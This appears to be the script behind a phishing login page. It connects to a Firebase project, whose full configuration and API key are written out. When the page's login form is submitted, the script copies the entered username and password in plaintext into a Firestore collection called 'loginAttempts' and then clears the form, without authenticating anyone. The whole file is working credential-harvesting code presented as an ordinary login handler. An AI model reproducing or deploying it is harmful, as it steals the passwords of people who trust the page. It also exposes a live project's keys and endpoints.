
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyByANBjLzBtTAsGNOwSSz5uqJm6QYuaw-g",
  authDomain: "youuh-5d9e3.firebaseapp.com",
  databaseURL: "https://youuh-5d9e3-default-rtdb.firebaseio.com",
  projectId: "youuh-5d9e3",
  storageBucket: "youuh-5d9e3.appspot.com",
  messagingSenderId: "772789757705",
  appId: "1:772789757705:web:a8e73acadfcaa4324795d8"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  try {
    await addDoc(collection(db, "loginAttempts"), {
      username,
      password,
      timestamp: serverTimestamp()
    });
    document.getElementById("loginForm").reset();
  } catch (err) {
    console.error("Error logging attempt:", err);
  }
});
